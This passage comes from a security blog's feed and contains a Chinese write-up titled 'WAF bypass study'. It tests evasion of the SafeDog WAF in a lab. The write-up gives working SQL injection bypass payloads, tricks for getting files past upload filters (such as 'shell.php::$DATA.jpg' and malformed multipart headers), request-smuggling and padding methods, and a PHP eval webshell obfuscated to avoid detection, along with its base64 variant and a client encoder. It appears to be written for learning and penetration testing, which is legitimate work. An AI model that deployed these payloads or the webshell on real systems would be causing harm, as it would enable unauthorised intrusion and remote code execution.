href="https://r17a-17.github.io/2021/09/04/Java-XXE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93">https://r17a-17.github.io/2021/09/04/Java-XXE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a></p><p><a href="https://xz.aliyun.com/t/6829#toc-4">https://xz.aliyun.com/t/6829#toc-4</a></p><p><strong>补充</strong>：<a href="https://tttang.com/archive/1813/#toc__2">https://tttang.com/archive/1813/#toc__2</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>waf绕过学习</title>
      <link href="/2023/06/01/waf%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/06/01/waf%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="知己知彼"><a href="#知己知彼" class="headerlink" title="知己知彼"></a>知己知彼</h2><p><a href="https://www.cnblogs.com/realjimmy/p/12937247.html">WAF功能介绍（入门扫盲篇） - 一觉醒来写程序 - 博客园</a></p><ul><li>规则引擎分为两块，对请求过滤和对响应过滤，而对请求过滤分为两大步，网络层过滤和应用层过滤。</li><li>WAF每条规则都会配置动作，对命中规则的请求进行对应的处理。</li></ul><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p><img src="/../images/image-20230516142728508.png" alt="image-20230516142728508"></p><p>本文以安全狗为例子进行简单学习</p><h3 id="部署位置"><a href="#部署位置" class="headerlink" title="部署位置"></a>部署位置</h3><p><img src="/../images/2015081104292360563.png" alt="enter image description here"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请求 → CDN → 云waf → 硬waf → WEB服务器 → 软waf → WEB应用程序（代码waf） → (数据库)</span><br></pre></td></tr></table></figure><h2 id="储备知识"><a href="#储备知识" class="headerlink" title="储备知识"></a>储备知识</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">waf了解</span><br><span class="line">各种语法</span><br><span class="line">http协议</span><br><span class="line">web服务器特性</span><br></pre></td></tr></table></figure><h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>没有在代码中进行过滤，如有会说明。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win  10</span><br><span class="line">php  5.6.9</span><br><span class="line">mysql 5.7.26</span><br><span class="line">apache 2.4.39</span><br><span class="line">safe dog V3.5 </span><br></pre></td></tr></table></figure><p>配置如下</p><p><img src="/../images/image-20230516235356524.png" alt="image-20230516235356524"></p><p><img src="/../images/image-20230516150636839.png" alt="image-20230516150636839"></p><p>特征</p><p><img src="/../images/image-20230517003655268.png" alt="image-20230517003655268"></p><p><img src="/../images/image-20230517100649383.png" alt="image-20230517100649383"></p><h3 id="迂回作战"><a href="#迂回作战" class="headerlink" title="迂回作战"></a>迂回作战</h3><blockquote><p>主打一个侧面绕过，利用各种缺陷和特性使得<strong>waf没有解析到payload</strong>，不与waf的规则和策略硬刚</p></blockquote><h4 id="Web服务器特性"><a href="#Web服务器特性" class="headerlink" title="Web服务器特性"></a>Web服务器特性</h4><blockquote><p>Web服务器解析与waf解析不同绕过</p></blockquote><h5 id="IIS-ASP"><a href="#IIS-ASP" class="headerlink" title="IIS+ASP"></a>IIS+ASP</h5><ul><li><p><code>%</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对于URL请求的参数值中的%，如果和后面的字符构成的字符串在URL编码表之外，ASP脚本处理时会将其忽略。</span><br><span class="line"></span><br><span class="line">select  →  se%lect</span><br></pre></td></tr></table></figure></li><li><p><code>unicode</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IIS会自动解码unicode</span><br></pre></td></tr></table></figure></li></ul><h5 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/path1/path2/ == ;/path1;foo/path2;bar/;</span><br></pre></td></tr></table></figure><h5 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h5><p>传递多个相同参数，利用waf和web服务器解析的参数不同来进行绕过</p><table><thead><tr><th align="left">Web 环境</th><th align="left">参数获取函数</th><th align="left">获取到的参数</th></tr></thead><tbody><tr><td align="left">PHP&#x2F;Apache</td><td align="left">$_GET(“par”)</td><td align="left">last</td></tr><tr><td align="left">JSP&#x2F;Tomcat</td><td align="left">Request.getParameter(“par”)</td><td align="left">first</td></tr><tr><td align="left">Perl(CGI)&#x2F;Apache</td><td align="left">Param(“par”)</td><td align="left">first</td></tr><tr><td align="left">Python&#x2F;Apache</td><td align="left">getvalue(“par”)</td><td align="left">[“first”,”last”]</td></tr><tr><td align="left">ASP.NET&#x2F;IIS</td><td align="left">Request.QueryString(“par”)</td><td align="left">first,last</td></tr></tbody></table><h4 id="Web应用程序层"><a href="#Web应用程序层" class="headerlink" title="Web应用程序层"></a>Web应用程序层</h4><blockquote><p>Web应用程序层（后端代码）解析与waf解析不同</p><p><strong>waf没有根据后端代码来修改策略和规则</strong></p></blockquote><h5 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h5><p>对请求数据进行编码，例如url编码，Unicode编码等，如果waf对数据不能有效的解码，而应用后端能够正常解码，就可以绕过waf。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">json数据支持unicode编码</span><br></pre></td></tr></table></figure><h5 id="多数据来源"><a href="#多数据来源" class="headerlink" title="多数据来源"></a>多数据来源</h5><p>web应用程序从多个地方取值，如</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php</span></span><br><span class="line"><span class="variable">$param</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;xxxx&#x27;</span>]</span><br></pre></td></tr></table></figure><p>可以从<code>GET,POST,HEADER,METHOD</code>等地方获取用户提交的参数。</p><p>如果waf只对<code>GET，POST</code>进行检测,没有与后端相适应，就可以绕过。</p><h4 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h4><h5 id="分块传输"><a href="#分块传输" class="headerlink" title="分块传输"></a>分块传输</h5><p>Burp插件：<a href="https://github.com/c0ny1/chunked-coding-converter">https://github.com/c0ny1/chunked-coding-converter</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Transfer-Encoding: chunked  <span class="comment"># 表示BODY的传输编码方式为chunked（无Content-Length字段）</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span> <span class="comment"># 指明传输的数据长度</span></span><br><span class="line">a=<span class="number">1</span></span><br><span class="line"><span class="number">0</span> <span class="comment"># 表示传输结束</span></span><br></pre></td></tr></table></figure><p>实验</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_REQUEST</span>[<span class="string">&#x27;id&#x27;</span>] 失败</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>] 成功</span><br></pre></td></tr></table></figure><h5 id="keep-alive"><a href="#keep-alive" class="headerlink" title="keep-alive"></a>keep-alive</h5><p>http长连接，发送多个数据包请求，感觉跟请求走私很像</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Keep-Alive</span><br></pre></td></tr></table></figure><p>需要关闭</p><p><img src="/../images/image-20230517113339255.png" alt="image-20230517113339255"></p><h5 id="multipart-x2F-form-data"><a href="#multipart-x2F-form-data" class="headerlink" title="multipart&#x2F;form-data"></a>multipart&#x2F;form-data</h5><p><strong>推荐阅读</strong></p><p><a href="http://www.moonslow.com/article/tencent_waf_bypass">http://www.moonslow.com/article/tencent_waf_bypass</a></p><blockquote><p><strong>想办法让WAF以为我们是在上传文件，而实际上却是在POST一个参数，这个参数可以是命令注入、SQL注入、SSRF等任意的一种攻击，这样就实现了通用WAF Bypass</strong></p><p>何时是上传文件？何时是POST参数呢？这个关键点在于有没有一个完整的，连续的**filename&#x3D;**，中间可以插入<code>\r\n</code>或者<code>\n</code></p></blockquote><p><img src="/../images/image-20230518163001348.png" alt="image-20230518163001348"></p><h5 id="畸形请求方法"><a href="#畸形请求方法" class="headerlink" title="畸形请求方法"></a>畸形请求方法</h5><p>抓包，然后修改请求方法</p><h5 id="chrest编码"><a href="#chrest编码" class="headerlink" title="chrest编码"></a>chrest编码</h5><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">content-type</span><span class="punctuation">: </span>charest=cp037</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ibm869</span><br><span class="line">ibm870</span><br><span class="line">ibm871</span><br><span class="line">ibm918</span><br><span class="line">iso-2022-cn</span><br><span class="line">iso-2022-jp</span><br><span class="line">iso-2022-jp-2</span><br><span class="line">iso-2022-kr</span><br><span class="line">iso-8859-1</span><br><span class="line">iso-8859-13</span><br><span class="line">iso-8859-15</span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse </span><br><span class="line">payload = <span class="string">&#x27;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&#x27;</span> </span><br><span class="line"><span class="built_in">print</span>(urllib.parse.quote_plus(payload.encode(<span class="string">&quot;IBM037&quot;</span> )))</span><br></pre></td></tr></table></figure><h4 id="waf特性"><a href="#waf特性" class="headerlink" title="waf特性"></a>waf特性</h4><blockquote><p>部署方式，策略与规则缺陷</p></blockquote><h5 id="云waf"><a href="#云waf" class="headerlink" title="云waf"></a>云waf</h5><p><img src="/../images/zh-cn_image_0000001193876233.png" alt="img"></p><p>​通过改变用户域名的DNS解析地址来将Web流量牵引到云WAF引擎集群，经过检测后再回源至真正的Web服务器。</p><p><img src="/../images/zh-cn_image_0000001159784637.png" alt="img"></p><p>​所以如果可以找到目标的真实ip，就可以绕过云waf。</p><h5 id="性能缺陷"><a href="#性能缺陷" class="headerlink" title="性能缺陷"></a>性能缺陷</h5><h6 id="高并发"><a href="#高并发" class="headerlink" title="高并发"></a>高并发</h6><p>用Burp的<code>Trubo Intruder</code>插件,失败</p><p>而且高并发很可能会造成业务系统出现问题。</p><h6 id="脏数据"><a href="#脏数据" class="headerlink" title="脏数据"></a>脏数据</h6><p>为了防止消耗太多的CPU、内存资源，因此许多WAF只检测前面的2M或4M的内容。所以可以通过填充垃圾数据进行绕过。</p><h6 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h6><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516150951130.png" alt="image-20230516150951130"></p><p>安全🐕在<code>HTTP BODY</code>中检测到了关键字，直接返回500。。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">a<span class="operator">=</span><span class="number">8172</span><span class="operator">*</span>A<span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516151625299.png" alt="image-20230516151625299"></p><h6 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h6><p><code>waf</code>可能直接检测长度来拦截</p><p>如安全🐕,<code>GET</code>下是不行的</p><p><img src="/../images/image-20230516151807403.png" alt="image-20230516151807403"></p><h5 id="白名单机制"><a href="#白名单机制" class="headerlink" title="白名单机制"></a>白名单机制</h5><ul><li><p>文件白名单</p><blockquote><p>一些 WAF 为了保证核心功能如登陆功能正常，会在内部设立一个文件白名单，或内容白名单，只要和这些文件或内容有关，无论怎么测试，都不会进行拦截。</p><p>如：WAF 设立了白名单<code>/admin</code>，那么我们的测试 payload 可以通过如下的手法来绕过</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 原来被拦截</span></span><br><span class="line">http:<span class="comment">//a.a/?id=123 and 2*3=6</span></span><br><span class="line"><span class="comment"># 现在不拦截</span></span><br><span class="line">http:<span class="comment">//a.a/?a=/admin&amp;id=123 and 2*3=6</span></span><br></pre></td></tr></table></figure></li><li><p>IP白名单</p><blockquote><p>后端通过Header字段获取源IP</p></blockquote><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">X-FORWARDED-FOR等</span><br></pre></td></tr></table></figure></li><li><p>UA白名单</p><blockquote><p>某些WAF可能为了不影响站点的SEO优化，将User-Agent为某些搜索引擎（如谷歌）的请求当作白名单处理，不检测和拦截。</p></blockquote><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">User-Agent</span><br></pre></td></tr></table></figure><p>UA收集：<a href="https://www.0735.pro/archives/study/51.html">https://www.0735.pro/archives/study/51.html</a></p></li></ul><h5 id="静态文件绕过"><a href="#静态文件绕过" class="headerlink" title="静态文件绕过"></a>静态文件绕过</h5><p>一些 WAF 为了减少服务器的压力，会对静态文件如<code>.png</code>、<code>.css</code>等直接放行，那么我们可以尝试伪装成静态文件来绕过</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 原来被拦截</span></span><br><span class="line">http:<span class="comment">//a.a/?id=123 and 2*3=6</span></span><br><span class="line"><span class="comment"># 现在不拦截</span></span><br><span class="line">http:<span class="comment">//a.a/?1.jpg&amp;id=123 and 2*3=6</span></span><br></pre></td></tr></table></figure><h5 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h5><ol><li>一些 WAF 对于<code>get</code>请求和<code>post</code>请求的处理机制不一样，可能对 POST 请求稍加松懈，因此给<code>GET</code>请求变成<code>POST</code>请求有可能绕过拦截。</li><li>一些 WAF 检测到<code>POST</code>请求后，就不会对<code>GET</code>携带的参数进行过滤检测，因此导致被绕过。</li></ol><h5 id="FUZZ"><a href="#FUZZ" class="headerlink" title="FUZZ"></a>FUZZ</h5><blockquote><p>fuzz大法，使用脚本去探测WAF设备对于字符处理是否有异常，一些WAF可能由于自身的解析问题，对于某些字符解析出错，造成全局的bypass</p></blockquote><p>测试点</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">1）：get请求处 </span><br><span class="line">2）：header请求处 </span><br><span class="line">3）：post urlencode内容处 </span><br><span class="line">4）：post form-data内容处</span><br></pre></td></tr></table></figure><p>基础内容</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">1）编码过的0-255字符 </span><br><span class="line">2）进行编码的0-255字符 </span><br><span class="line">3）utf gbk字符</span><br></pre></td></tr></table></figure><h3 id="正面硬刚"><a href="#正面硬刚" class="headerlink" title="正面硬刚"></a>正面硬刚</h3><blockquote><p>增增改改混淆视听，使waf的规则和策略失效</p><p><strong>基本方针</strong>：</p><ol><li>增删测试waf容忍度，确认关键点</li><li>本地FUZZ PAYLOAD,先保证可以绕过检测</li><li>再次进行构造使得后端能够进行解析</li></ol></blockquote><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>简单fuzz</p><p><img src="/../images/image-20230517001306283.png" alt="image-20230517001306283"></p><p>可以发现不会对单一的关键字进行过滤，会对一些组合进行过滤</p><h5 id="union-select绕过"><a href="#union-select绕过" class="headerlink" title="union select绕过"></a><code>union select</code>绕过</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union (select)</span><br><span class="line">UNiOn/*/1/*/select</span><br><span class="line">UNiOn--+%02%0d%0aselect    #注释换行</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">UNiOn</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516154023102.png" alt="image-20230516154023102"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">UNiOn</span><span class="comment">/*/1/*/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516154137250.png" alt="image-20230516154137250"></p><p>在<code>/**/</code>中插入<code>/x/</code>即可，x至少为一个字符</p><h5 id="函数绕过"><a href="#函数绕过" class="headerlink" title="函数绕过"></a>函数绕过</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span><span class="comment">/*/1/*/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database()<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516221518813.png" alt="image-20230516221518813"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span><span class="comment">/*/1/*/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database<span class="comment">/**/</span>()<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516221551123.png" alt="image-20230516221551123"></p><p>FUZZ结果</p><p><img src="/../images/image-20230517000942363.png" alt="image-20230517000942363"></p><p><img src="/../images/image-20230517000931846.png" alt="image-20230517000931846"></p><h5 id="select-from"><a href="#select-from" class="headerlink" title="select from"></a><code>select from</code></h5><p>硬刚G</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分块传输，脏数据等成功</span><br></pre></td></tr></table></figure><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><h5 id="waf检测内容"><a href="#waf检测内容" class="headerlink" title="waf检测内容"></a>waf检测内容</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请求的url</span><br><span class="line">Boundary边界</span><br><span class="line">MIME类型</span><br><span class="line">文件后缀名</span><br><span class="line">文件头</span><br><span class="line">文件内容</span><br><span class="line">访问流量</span><br></pre></td></tr></table></figure><h5 id="文件上传数据包"><a href="#文件上传数据包" class="headerlink" title="文件上传数据包"></a>文件上传数据包</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">    </span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">submit</span><br><span class="line">------WebKitFormBoundary9zWBDx6vAJHGTpAl--</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl 定义了BODY中的分界线(因为是谷歌浏览器，所以分界线为----WebKitFormBoundary加上随机字符串)</span><br><span class="line"></span><br><span class="line">--boundary</span><br><span class="line"></span><br><span class="line">--boundary   <span class="comment"># 每两个分界线之间是具体的内容：文件上传，post参数</span></span><br><span class="line"></span><br><span class="line">--boundary--  <span class="comment"># 结束标志</span></span><br></pre></td></tr></table></figure><h5 id="安全🐕测试"><a href="#安全🐕测试" class="headerlink" title="安全🐕测试"></a>安全🐕测试</h5><ul><li><p>不允许php后缀上传</p></li><li><p>上传时，不检查文件内容</p></li><li><p>访问时，不允许访问含有恶意内容的php文件</p></li></ul><h6 id="绕过后缀"><a href="#绕过后缀" class="headerlink" title="绕过后缀"></a>绕过后缀</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=a</span><br><span class="line"></span><br><span class="line">增加多个boundary</span><br><span class="line">php：可以在boundary前后添加任意字符</span><br><span class="line">大小写</span><br><span class="line">boundary=boundary=a</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line"></span><br><span class="line">操作：</span><br><span class="line">大小写</span><br><span class="line">Content-Disposition 任意位置换行,空格，脏数据溢出，多个Content-Disposition，form-data（删除，改为*）</span><br><span class="line">多个filename，多个;</span><br><span class="line">文件名单双引号数量</span><br><span class="line">content-type（增删，设置charset）</span><br><span class="line">多个BODY</span><br><span class="line">多个boundary</span><br><span class="line">交换name和filename的顺序</span><br><span class="line">排列组合</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: </span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Accept-Encoding: compress</span><br><span class="line">Accept-Encoding: deflate</span><br><span class="line">Accept-Encoding: br</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">Accept-Encoding: *</span><br></pre></td></tr></table></figure><p>Windows</p><ul><li>NTFS 流</li></ul><p>  <a href="https://learn.microsoft.com/zh-cn/windows/win32/fileio/file-streams">文件流 (本地文件系统) - Win32 apps | Microsoft Learn</a></p><p>  fuzz可以的</p>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">::$DATA</span><br><span class="line">::$INDEX_ALLOCATION</span><br></pre></td></tr></table></figure><p>  <img src="/../images/20171227163716-2507a226-eae1-1.png" alt="20171227163716-2507a226-eae1-1"></p><p>  <img src="/../images/image-20230517195752567.png" alt="image-20230517195752567"></p><ul><li><p>文件名</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">文件名尾加任意个. 或者任意个空格（对文件名无影响）</span><br><span class="line"></span><br><span class="line">windows文件名的保留字符（不允许出现）</span><br><span class="line">\/:*?<span class="string">&quot; &lt;&gt;|</span></span><br><span class="line"><span class="string">可以尝试在文件名后加上这些字符</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当filename=shell.php:.jpg</span><br><span class="line">结果：</span><br><span class="line">可以上传shell.php，但是会吃掉文件内容。。。</span><br><span class="line">其他的要不不可以，可以的话，上传的文件名为.jpg</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20230517155239619.png" alt="image-20230517155239619"></p><ul><li><p>文件名长度</p><p>截断超长文件名</p><p>windows文件名</p><p><img src="/../images/image-20230618171438236.png" alt="image-20230618171438236"></p><p>linux文件名：linux中文件名最长为255字符，文件路径最大长度为4096字符</p><p>如果后端脚本没有限制上传文件名长度，可以通过多次测试，上传名为aaaaa…(200+).php.jpg，把最后的.jpg挤出去。</p></li></ul><p><strong>部分成功的，好绕</strong></p><p>waf是解析最后一个参数，最后一个;后面的，但是如果最后一个；后面没有参数，</p><p>后端就取前一个,waf识别到空</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=shell.php;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517144614924.png" alt="image-20230517144614924"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=<span class="string">&#x27;shell.php&#x27;</span>; <span class="comment"># 双引号不行</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517144541805.png" alt="image-20230517144541805"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>;filename=shell.php</span><br><span class="line"></span><br><span class="line">除了shell.php处，其他地方加换行，或脏数据都可</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517145839048.png" alt="image-20230517145839048"></p><p>删除<code>content-type</code></p><p><img src="/../images/image-20230517153416749.png" alt="image-20230517153416749"></p><p>增加<code>boundary</code></p><p><img src="/../images/image-20230517175433650.png" alt="image-20230517175433650"></p><p>安全🐕+代码白名单（后缀只允许图片）</p><p>上面任意一个绕过（除了；绕过）+</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=shell.php::$DATA.jpg</span><br></pre></td></tr></table></figure><h6 id="绕过文件内容检测–免杀"><a href="#绕过文件内容检测–免杀" class="headerlink" title="绕过文件内容检测–免杀"></a>绕过文件内容检测–免杀</h6><p>安全🐕的内容检测随便改一下就过了。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="comment">// $cmd = base64_decode($_POST[1]);</span></span><br><span class="line"><span class="variable">$foo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h6 id="绕过流量"><a href="#绕过流量" class="headerlink" title="绕过流量"></a>绕过流量</h6><p>测试时</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;xxx&quot;</span>) <span class="comment">#命令执行限制</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517211700124.png" alt="image-20230517211700124"></p><p>对流量进行一个<code>base64</code>加密即可</p><p><code>webshell</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="variable">$foo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>蚁剑</p><p>编码器</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data[pwd] = Buffer.<span class="keyword">from</span>(data[<span class="string">&#x27;_&#x27;</span>]).<span class="title function_ invoke__">toString</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br></pre></td></tr></table></figure><p>选择编码器</p><p><img src="/../images/image-20230517211627163.png" alt="image-20230517211627163"></p><h5 id="webshell免杀"><a href="#webshell免杀" class="headerlink" title="webshell免杀"></a>webshell免杀</h5><ul><li>waf检测</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">内容、创建日期、文件大小、通信流量特征</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对于静态引擎的绕过，可以通过拆分关键词、</span><br><span class="line">加入能够引发解析干扰的畸形字符等;</span><br><span class="line"></span><br><span class="line">而对于动态引擎，需要分析它跟踪了哪些输入</span><br><span class="line">点，又是如何跟踪变量的，最终是在哪些函数的哪些参数命中了恶意样本规则</span><br></pre></td></tr></table></figure><p><a href="https://www.k0rz3n.com/2019/03/01/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/">简单理解污点分析技术 | K0rz3n’s Blog</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">另类的入口</span><br><span class="line">各种混淆（编码加密，进制转换，反序列化...）</span><br><span class="line">符号干扰，绕过正则，拼接null,\n,\r,\t等</span><br><span class="line">信息差绕过（加入外部因素后才是webshel，量子WEBshell😋）比如截取文件名，目录名，传入随机数种子等</span><br></pre></td></tr></table></figure><ul><li>传统webshell</li></ul><p>学习：</p><p><a href="https://cloud.tencent.com/developer/article/1625439">WebShell通用免杀的思考 - 腾讯云开发者社区-腾讯云</a></p><p><a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/php-webshell-detect-bypass/php-webshell-detect-bypass.md">https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/php-webshell-detect-bypass/php-webshell-detect-bypass.md</a></p><p><a 